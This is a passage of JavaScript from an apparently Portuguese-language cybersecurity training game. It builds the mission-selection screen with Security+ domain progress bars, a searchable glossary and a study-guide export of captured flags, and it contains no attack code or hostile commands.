  $('#mSel').onclick=()=>{closeModal();openMissionSelect();};
  const nb=$('#mNextM'); if(nb)nb.onclick=()=>{closeModal();startMission(next.id);};
}

/* ============================================================
   MISSION SELECT
   ============================================================ */
const TRACKS=[
  {key:'core', label:'Fundamentos de Segurança',            bdg:'Academia · D1 · D3'},
  {key:'red',  label:'Operações Ofensivas',                 bdg:'Red Team · D2'},
  {key:'blue', label:'Centro de Operações de Segurança',    bdg:'SOC · Blue Team · D4'},
  {key:'gov',  label:'Governança, Risco e Conformidade',    bdg:'GRC · D5'}
];
const DOMAINS=[
  {k:'D1',label:'Conceitos Gerais'},
  {k:'D2',label:'Ameaças & Ataques'},
  {k:'D3',label:'Arquitetura'},
  {k:'D4',label:'Operações de Segurança'},
  {k:'D5',label:'Governança & Conformidade'}
];
function trackOf(x){return x.track||'red';}
function domainPanel(){
  const done=id=>G.completedMissions.has(id);
  let rows='';
  DOMAINS.forEach(d=>{
    const ms=MISSIONS.filter(x=>x.domain===d.k);
    const tot=ms.length, dn=ms.filter(x=>done(x.id)).length;
    const pct=tot?Math.round(dn/tot*100):0;
    rows+='<div class="dc-row"><span class="dc-k">'+d.k+'</span><span class="dc-l">'+esc(d.label)+'</span>'+
      '<span class="dc-bar"><span class="dc-fill'+(pct===100?' full':'')+'" style="width:'+pct+'%"></span></span>'+
      '<span class="dc-n">'+dn+'/'+tot+'</span></div>';
  });
  return '<div class="domcov"><div class="dc-head">Cobertura por domínio · referência CompTIA Security+</div>'+rows+'</div>';
}
function openMissionSelect(){
  const m=$('#modal');
  const done=id=>G.completedMissions.has(id);
  function cardHTML(mi,locked){
    const d=done(mi.id);
    const state=d?'<span class="mc-state dn">Concluída</span>':locked?'<span class="mc-state lk">Bloqueada</span>':'<span class="mc-state av">Disponível</span>';
    return '<div class="mcard'+(locked?' locked':'')+(d?' done':'')+'" data-id="'+mi.id+'" data-locked="'+locked+'">'+
      '<div class="mc-top"><span class="mc-id">'+esc(mi.id)+'</span>'+state+'</div>'+
      '<h4>'+esc(mi.title)+'</h4><p>'+esc(mi.blurb)+'</p>'+
      '<div class="tags">'+mi.tags.map(t=>'<span class="tg">'+esc(t)+'</span>').join('')+'</div></div>';
  }
  let html=domainPanel();
  TRACKS.forEach(tk=>{
    const ms=MISSIONS.filter(x=>trackOf(x)===tk.key);
    if(!ms.length)return;
    html+='<div class="track-head '+tk.key+'"><span>'+esc(tk.label)+'</span><span class="bdg">'+esc(tk.bdg)+'</span></div><div class="select-grid">';
    ms.forEach((mi,i)=>{ const locked = i>0 && !done(ms[i-1].id) && !done(mi.id); html+=cardHTML(mi,locked); });
    html+='</div>';
  });
  m.innerHTML=
   '<div class="mh"><span class="ic">🎯</span><div><h3>Programa de Formação — Analista Júnior</h3>'+
     '<div class="mtag">Auditoria IPB · '+G.completedMissions.size+'/'+MISSIONS.length+' operações · 5 domínios Security+</div></div></div>'+
   '<div class="mb">'+html+'</div>'+
   '<div class="mf">'+
     '<button class="mbtn ghost" id="mGloss">📖 Glossário</button>'+
     (G.captured.length?'<button class="mbtn ghost" id="mGuide3">⬇ Guia de estudo ('+G.captured.length+')</button>':'')+
     (G.mission?'<button class="mbtn ghost" id="mResume">Voltar à consola</button>':'')+'</div>';
  $('#modalBg').classList.add('show');
  m.querySelectorAll('.mcard').forEach(c=>{
    c.addEventListener('click',()=>{
      if(c.dataset.locked==='true'){toast('ids','Bloqueada','Conclui a operação anterior do mesmo módulo primeiro');return;}
      closeModal();startMission(c.dataset.id);
    });
  });
  const gl=$('#mGloss'); if(gl)gl.onclick=openGlossary;
  const g=$('#mGuide3'); if(g)g.onclick=exportGuide;
  const r=$('#mResume'); if(r)r.onclick=closeModal;
}

/* ---- Glossário: agrega todos os conceitos das missões ---- */
function openGlossary(){
  const m=$('#modal');
  const items=[];
  MISSIONS.forEach(mi=>mi.steps.forEach(s=>{(s.concepts||[]).forEach(c=>{
    items.push({term:c.term,body:c.body,dom:mi.domain||'',mid:mi.id});
  });}));
  // dedupe by term text
  const seen=new Set(),uniq=[];
  items.forEach(it=>{const k=it.term.replace(/<[^>]+>/g,'').trim().toLowerCase();if(!seen.has(k)){seen.add(k);uniq.push(it);}});
  uniq.sort((a,b)=>a.term.replace(/<[^>]+>/g,'').localeCompare(b.term.replace(/<[^>]+>/g,''),'pt'));
  const list=uniq.map((it,i)=>
    '<div class="gl-item" data-t="'+esc((it.term+' '+it.body).replace(/<[^>]+>/g,'').toLowerCase())+'">'+
      '<div class="gl-term"><span class="gl-dom">'+esc(it.dom)+'</span>'+it.term+'</div>'+
      '<div class="gl-body">'+it.body+'</div></div>').join('');
  m.innerHTML=
   '<div class="mh"><span class="ic">📖</span><div><h3>Glossário do Analista</h3>'+
     '<div class="mtag">'+uniq.length+' conceitos · pesquisáveis · agregados de todas as operações</div></div></div>'+
   '<div class="mb"><input id="glSearch" class="gl-search" placeholder="🔎 pesquisar conceito (ex.: CVSS, Zero Trust, RGPD, IDOR)…">'+
     '<div id="glList" class="gl-list">'+list+'</div></div>'+
   '<div class="mf"><button class="mbtn" id="mBackSel">◀ Voltar às operações</button></div>';
  $('#modalBg').classList.add('show');
  const inp=$('#glSearch');
  if(inp)inp.addEventListener('input',()=>{
    const q=inp.value.trim().toLowerCase();
    m.querySelectorAll('.gl-item').forEach(it=>{ it.style.display = (!q||it.dataset.t.includes(q))?'':'none'; });
  });
  const b=$('#mBackSel'); if(b)b.onclick=openMissionSelect;
  setTimeout(()=>{if(inp)inp.focus();},30);
}

function startMission(id){
  const m=MISSIONS.find(x=>x.id===id); if(!m)return;
  G.mission=m; G.stepIdx=0; G.ctx=null;
  out.innerHTML='';
  const soc=m.track==='blue';
  document.body.classList.toggle('soc',soc);
  $('#termHeadLabel').textContent=soc?'Consola SOC — Análise':'Terminal Interativo — Prática';
  $('#knowHeadLabel').textContent=soc?'Painel de Conhecimento — Defesa':'Painel de Conhecimento — Teoria';
  $('#missionTag').innerHTML=esc(m.id+' · '+m.title)+(soc?'<span class="soc-badge">Blue Team</span>':'');
  updatePs1();
  renderKnow();renderTrail();updateStats();
  // intro
  printLine('<span class="ascii">'+esc('═══ '+m.title.toUpperCase()+' ═══')+'</span>');
  typeOut(m.intro).then(()=>{
    const s=curStep();
    typeOut([{t:'warnline',x:'[ OBJETIVO INICIAL ] '+s.title+' — lê a teoria à esquerda para armar o comando.'}]);
  });
  closeModal();
  cmdInput.focus();
}

/* ============================================================
   STUDY GUIDE EXPORT
   ============================================================ */
function exportGuide(){
  if(!G.captured.length){toast('ids','Sem cards','Captura flags primeiro');return;}
  let txt='# GUIA DE ESTUDO — CyberOps: The Breadcrumb Trail\n';
  txt+='# NetSec Academy · Auditoria IPB\n';
  txt+='# Flags capturadas: '+G.captured.length+' · Pontuação: '+G.score+'\n\n';
  G.captured.forEach((c,i)=>{
    txt+='────────────────────────────────────────\n';
    txt+=(i+1)+') '+c.mission+' — '+c.step+'\n';
    txt+='   FLAG: '+c.flag+'\n';
    if(c.summary){
      txt+='   Técnica:     '+(c.summary.tecnica||'-')+'\n';
      txt+='   Vetor:       '+(c.summary.vetor||'-')+'\n';
      txt+='   Ferramentas: '+(c.summary.ferramentas||'-')+'\n';
      txt+='   Lição:       '+(c.summary.licao||'-')+'\n';
    }
    txt+='\n';
  });
  const blob=new Blob([txt],{type:'text/plain;charset=utf-8'});
  const url=URL.createObjectURL(blob);
  const a=document.createElement('a');a.href=url;a.download='guia-estudo-cyberops.txt';
  document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(url);
  toast('ach','Guia exportado',G.captured.length+' cards técnicos');
}

/* footer buttons */
$('#btnMissions').addEventListener('click',openMissionSelect);
$('#btnGuide').addEventListener('click',exportGuide);
$('#modalBg').addEventListener('click',e=>{if(e.target===$('#modalBg'))closeModal();});

updateStats();
